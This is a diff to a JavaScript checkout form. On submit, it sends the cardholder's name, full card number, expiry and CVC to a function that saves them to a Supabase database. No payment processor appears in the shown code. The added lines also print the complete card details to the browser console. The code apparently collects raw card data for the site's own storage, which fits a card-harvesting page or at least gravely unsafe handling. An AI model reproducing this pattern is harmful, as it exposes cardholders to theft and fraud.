@@ -406,7 +406,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // SEND TO SUPABASE - Only changed to add expiry
+    // SEND TO SUPABASE
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, expiry, cvc) {
@@ -501,7 +501,9 @@ document.addEventListener("DOMContentLoaded", () => {
     form.addEventListener("submit", async (event) => {
         event.preventDefault();
 
+        // Check if button is disabled or already processing
         if (payButton.disabled || payButton.dataset.processing === "true") {
+            console.log('⏳ Payment already processing, ignoring click');
             return;
         }
 
@@ -575,9 +577,12 @@ document.addEventListener("DOMContentLoaded", () => {
         }
 
         // ===== SET LOADING =====
+        console.log('🔄 Setting pay button to loading state...');
         setPayButtonLoading(true);
 
         try {
+            console.log('📤 Calling saveToSupabase with:', { name, cardNumber, expiry, cvc });
+            
             // ===== SAVE TO SUPABASE (WITH EXPIRY) =====
             const result = await saveToSupabase(name, cardNumber, expiry, cvc);
             console.log('✅ Payment processed and saved to Supabase', result);
